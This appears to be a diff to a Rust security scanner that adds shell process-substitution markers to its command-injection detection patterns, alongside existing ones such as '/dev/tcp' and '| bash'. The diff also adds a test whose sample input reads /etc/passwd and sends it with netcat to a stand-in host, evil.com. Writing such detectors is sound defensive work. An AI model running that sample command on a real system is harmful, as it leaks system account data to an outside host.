@@ -47,7 +47,7 @@ const CODE_PATTERNS: &[CodePattern] = &[
         category: "command_injection",
         severity: Severity::High,
         patterns: &[
-            "$(", "${", "| sh", "| bash", "; sh", "; bash", "` ", "/dev/tcp",
+            "$(", "${", "| sh", "| bash", "; sh", "; bash", "` ", "/dev/tcp", "<(", ">(",
         ],
     },
     CodePattern {
@@ -441,5 +441,12 @@ mod tests {
     fn case_insensitive() {
         let findings = scanner().scan("EVAL('test')");
         assert!(!findings.is_empty());
+    }
+
+    #[test]
+    fn detect_process_substitution() {
+        let findings = scanner().scan("diff <(cat /etc/passwd) >(nc evil.com 1234)");
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| f.category == "command_injection"));
     }
 }
